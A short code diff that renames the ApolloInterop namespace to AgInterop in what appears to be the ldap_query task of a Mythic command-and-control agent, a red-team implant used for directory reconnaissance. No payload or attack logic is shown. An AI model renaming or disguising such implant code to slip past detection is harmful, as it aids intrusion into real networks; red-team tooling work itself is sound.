@@ -6,10 +6,10 @@
 
 #if LDAP_QUERY
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Utils;
+using AgInterop.Classes;
+using AgInterop.Interfaces;
+using AgInterop.Structs.MythicStructs;
+using AgInterop.Utils;
 using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
@@ -295,7 +295,7 @@ namespace Tasks
             public int limit;
         }
 
-        public ldap_query(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public ldap_query(IAgent agent, AgInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
